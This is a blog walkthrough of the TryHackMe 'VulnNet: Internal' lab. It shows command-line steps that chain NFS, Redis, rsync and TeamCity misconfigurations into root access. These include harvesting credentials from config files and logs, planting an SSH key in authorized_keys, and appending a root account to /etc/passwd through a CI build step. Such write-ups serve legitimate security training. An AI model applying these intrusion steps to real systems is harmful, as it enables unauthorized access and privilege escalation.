## THM: VulnNet: Internal
This is [VulnNet: Internal](https://tryhackme.com/room/vulnnetinterna) from THM. It's rated as Easy/Medium rated, and says:

>VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.

I guess that means this is my pentest report?

## Ports
So. Many. Ports. I could dump all of the nmap output here but that's not my jam. Let's summarise: we have SSH, RPCBind, rsync, Redis, NFS and some other nonsense we don't care about. Where to begin?

## NFS
Mounting the share of course. Broadly it looked like this:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/vninternal]
â””â”€# showmount -e 10.10.247.87
Export list for 10.10.247.87:
/opt/conf *
                                                                                         â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/vninternal]
â””â”€# mkdir mountpt   
                                              
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/vninternal]
â””â”€# mount -t nfs 10.10.247.87: ./mountpt
{% endhighlight %}

There was a bunch of configuration stuff in there, including for Redis, which was one of our services:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/â€¦/mountpt/opt/conf/redis]
â””â”€# cat redis.conf          

# etc
requirepass "B65Hx562F@ggAZ@F"
# more etc
{% endhighlight %}

## Redis
With our password we can do this:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/vninternal]
â””â”€# nc 10.10.247.87 6379
AUTH B65Hx562F@ggAZ@F
+OK
KEYS *
*5
$8
authlist
$10
marketlist
$13
internal flag
$3
int
$3
tmp
lrange authlist 0 10
*4
$112
QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==
{% endhighlight %}

Note that there was a flag there too, so get that if you want. **authlist** was a list, hence the *lrange* command. You can use redis-cli but you don't need to. What is the base64?

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/vninternal]
â””â”€# echo 'QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==' | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
{% endhighlight %}

Creds for rsync.

## rsync
**rsync** is running on Port 873 and we can't use our creds for SSH. When running like this we need to know the 'module' name, so I use an nmap script:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/vninternal]
â””â”€# nmap -p 873 --script rsync-list-modules 10.10.247.87                                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 07:26 EDT
Nmap scan report for 10.10.247.87
Host is up (0.32s latency).

PORT    STATE SERVICE
873/tcp open  rsync
| rsync-list-modules: 
|_  files               Necessary home interaction

Nmap done: 1 IP address (1 host up) scanned in 2.99 seconds
{% endhighlight %}

Now we've got that, I do this:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/vninternal]
â””â”€# rsync -a rsync://rsync-connect@10.10.247.87:/files what 
{% endhighlight %}

And that copies everything in the *files* module to the *what* directory on my machine. *files* (and by extension *what*) appears to be the /home directory from the server. We have a user called **sys-internal**. Sys-internal has an SSH directory but no keys. I send my public key up via rsync and then we can log in. Note that in the below, my SSH public key was in the *foo.txt* file.

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/vninternal]
â””â”€# rsync -avz foo.txt rsync://rsync-connect@10.10.247.87:/files/sys-internal/.ssh/authorized_keys

â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/vninternal]
â””â”€# ssh sys-internal@10.10.247.87

## Privesc
This blog has **no** screenshots, and that's quite deliberate because I want to be able to copy and paste stuff from here, which you obviously can't do with a screenshot. So some of the privesc I'll just have to describe. 

Anyway, this did take me a little bit to figure out but here goes. Poking around logged in as *sys-internal* we can find */TeamCity* and there is a whole bunch of stuff in there but nothing immediately stands out as useful. Linpeas won't give us much, but it does show TeamCity running as root, e.g. 

{% highlight shell %}
root       874 15.2 36.7 3438176 749952 ?      Sl   03:40   2:52      _ /usr/lib/jvm/default-java/bin/java -Djava.util.logging.config.file=/TeamCity/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -server -Xmx1024m -Dteamcity.configuration.path=../conf/teamcity-startup.properties -Dlog4j.configuration=file:/TeamCity/bin/../conf/teamcity-server-log4j.xml -Dteamcity_logs=/TeamCity/bin/../logs -Djava.awt.headless=true -Dignore.endorsed.dirs= -classpath /TeamCity/bin/bootstrap.jar:/TeamCity/bin/tomcat-juli.jar -Dcatalina.base=/TeamCity -Dcatalina.home=/TeamCity -Djava.io.tmpdir=/TeamCity/temp org.apache.catalina.startup.Bootstrap start
{% endhighlight %}

For some reason, linpeas won't show us the open ports:

{% highlight shell %}

{% endhighlight %}

Crickets. Humph. Now I did go down a different path for a while (Apache XML-RPC) but that wasn't it; it is TeamCity. Where do we find it? Ask [JetBrains](https://www.jetbrains.com/help/teamcity/installing-and-configuring-the-teamcity-server.html#Installing+TeamCity+Server):

>After installation, the TeamCity web UI can be accessed via a web browser. The default addresses are http://localhost/ for Windows distribution and http://localhost:8111/ for the tar.gz distribution.

I set up a port forward:

``
ssh -L 9999:127.0.0.1:8111 sys-internal@10.10.4.9
``

Note the different THM IP is because I did this in two sessions. Once I've got the port forward I can access the TeamCity GUI at localhost:9999. There, we can login as the *super user* but in order to do so, we need a [super user authentication token](https://stackoverflow.com/questions/4057891/teamcity-username-password). It's supposed to be in a particular file; let's check:

{% highlight shell %}
sys-internal@vulnnet-internal:/TeamCity/logs$ cat teamcity-server.log
cat: teamcity-server.log: Permission denied
{% endhighlight %}

D'oh! Maybe there is another place....?

{% highlight shell %}
sys-internal@vulnnet-internal:/TeamCity/logs$ grep -r token
grep: teamcity-nodes.log: Permission denied
# etc, stuff
grep: host-manager.2021-05-07.log: Permission denied
catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)

catalina.out:[TeamCity] Super user authentication token: 1540729311393804712 (use empty username with the token as the password to access the server)
catalina.out:[TeamCity] Super user authentication token: 1540729311393804712 (use empty username with the token as the password to access the server)
grep: catalina.2021-05-07.log: Permission denied
# etc, stuff
{% endhighlight %}

We have a selection to choose from. Only one works; try and find out which!

Once we log in - now what? I've never seen this thing before and what the hell does it do? According to [Wikipedia](https://en.wikipedia.org/wiki/TeamCity), it's a:

>build management and continuous integration server 

Yeah cool. Can I get root or not? According to the [documentation](https://www.jetbrains.com/help/teamcity/command-line.html):

>Using the Command Line build runner, you can run any script supported by the OS.

Wonderful. So the next part was all GUI but it was basically create a project, add a Build Step which was a Custom Script, in my case it was adding a new user to /etc/passwd; the syntax was:

``
echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd
``

There a few bits you have to fill in and then a 'run' button will appear near the top of the page; click it and it completes; the project doesn't need to do anything else. It's not too hard to figure out.

Then in my shell:

{% highlight shell %}
sys-internal@vulnnet-internal:/TeamCity/logs$ su root2
Password: 
root@vulnnet-internal:/TeamCity/logs# id;hostname;date
uid=0(root) gid=0(root) groups=0(root)
vulnnet-internal
Fri May  7 04:32:56 CEST 2021
root@vulnnet-internal:/TeamCity/logs#
{% endhighlight %}

Yeah baby, that's the stuff. Good box TheCyb3rW0lf
